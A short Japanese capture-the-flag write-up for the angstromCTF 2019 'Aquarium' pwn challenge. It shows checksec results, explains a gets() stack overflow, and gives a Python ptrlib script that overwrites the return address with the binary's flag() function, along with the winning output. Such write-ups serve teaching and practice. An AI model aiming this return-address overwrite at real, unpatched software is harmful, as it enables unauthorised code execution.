# [pwn 50pts] Aquarium - angstromCTF 2019
64bitでDEP以外無効です。
```
$ checksec aquarium
[*] 'aquarium'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```

何かいろんな数字をscanfで入力した後、最後にgetsがあるのでオーバーフローです。
フラグを読み込んで表示するflag関数もあるので、それを呼びましょう。

```python
from ptrlib import *

elf = ELF("./aquarium")
#sock = Process(["stdbuf", "-o0", "./aquarium"])
sock = Socket("shell.actf.co", 19305)

_ = input()

print(hex(elf.symbol("flag")))
payload = b"A" * 0x98
payload += p64(elf.symbol("flag"))

# Stage 1
sock.sendline("1")
sock.sendline("2")
sock.sendline("3")
sock.sendline("4")
sock.sendline("5")
sock.sendline("6")
sock.recvuntil("Enter the name of your fish tank: ")
sock.sendline(payload)

sock.interactive()
```

おっけー。
```
$ python solve.py 
[+] Socket: Successfully connected to shell.actf.co:19305

0x4011b6
[ptrlib]$ actf{overflowed_more_than_just_a_fish_tank}
```

# 感想
pwn初心者向けの問題だと思います。
（私も初心者なので競技開始後しばらく解けなかったです（問題バイナリが途中で変わってました））